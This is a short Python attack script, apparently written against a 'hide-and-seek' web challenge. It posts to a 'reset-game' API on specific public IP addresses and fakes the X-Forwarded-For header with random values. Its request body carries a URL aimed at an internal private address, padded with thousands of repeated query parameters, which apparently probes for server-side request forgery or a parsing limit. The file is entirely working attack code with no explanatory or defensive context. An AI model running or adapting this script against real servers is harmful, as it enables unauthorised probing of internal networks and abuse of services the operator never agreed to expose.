import requests, os

pathes = [
    'http://15.165.37.31:3000/api/reset-game',
    'http://3.38.141.72:3000/api/reset-game',
    'http://43.203.168.235:3000/api/reset-game',
]

headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Length': '49',
    'Content-Type': 'text/plain;charset=UTF-8',
    'Origin': 'http://15.165.37.31:3000',
    'Pragma': 'no-cache',
    'Referer': 'http://15.165.37.31:3000/hide-and-seek',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
}

#page = input("page: ")
page = 'a' * 32 * 1024
headers['X-Forwarded-For'] = os.urandom(16).hex()
response = requests.post(
    'http://43.203.168.235:3000/api/reset-game',
    headers=headers,
    data='{"url":"http://192.168.200.120:808/login?' + 'c=a&' * 4000 + 'd=b"}'
)

print('http://192.168.200.120:808/' + page, '=>', response.status_code, response.text)